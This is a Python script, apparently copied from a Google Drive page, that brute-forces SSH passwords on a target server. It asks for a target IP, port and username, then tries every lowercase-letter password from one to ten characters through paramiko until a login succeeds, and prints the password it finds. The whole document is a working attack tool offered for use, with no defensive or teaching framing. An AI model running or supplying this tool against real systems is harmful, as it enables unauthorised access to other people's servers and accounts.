Pembaruan pada pintasan keyboard … Pada Kamis, 01 Agustus 2024, pintasan keyboard Drive akan diperbarui untuk memberi Anda navigasi huruf pertamaPelajari lebih lanjut
#SEBELUM RUN JALANI PERINTAH INI DI TERMINAL UNTUK MENGINSTALL paramiko
#pip install paramiko

import paramiko
import string
import itertools

# Informasi SSH untuk masuk ke server target
ssh_host = str(input("IP Target: "))
ssh_port = int(input("Port Target: "))

# Informasi target user
target_user = str(input("Username of The Target: "))
ssh_username = target_user  # Gunakan target_user sebagai username

attempts = 0  # Counter for keeping track of attempts
tried_passwords = set()  # Set to store passwords that have been tried

# Function to generate passwords in sequence (1 digit to 10 digits, then aa, ab, ac, ...)
def generate_password_sequence():
    for length in range(1, 11):  # Generate passwords from 1 digit to 10 digits
        for combination in itertools.product(string.ascii_lowercase, repeat=length):
            yield ''.join(combination)

try:
    ssh_client = paramiko.SSHClient()
    ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    password_generator = generate_password_sequence()

    while True:
        password = next(password_generator)  # Get the next password in the sequence

        if password in tried_passwords:
            # Skip passwords that have been tried before
            continue

        try:
            ssh_client.connect(ssh_host, ssh_port, ssh_username, password)
            # Jika koneksi berhasil, password yang valid ditemukan
            print("[>] Valid password found: '{}'!".format(password))
            break

        except paramiko.ssh_exception.AuthenticationException:
            # Jika gagal login, lanjutkan mencoba password lainnya
            ssh_client.close()  # Close the SSH session
            pass

        except Exception as e:
            print("Error:", str(e))

        attempts += 1
        print("[{}] Attempting password: '{}'".format(attempts, password))
        tried_passwords.add(password)  # Add the tried password to the set

except paramiko.ssh_exception.AuthenticationException:
    print("[-] SSH authentication to the target user failed!")

finally:
    ssh_client.close()
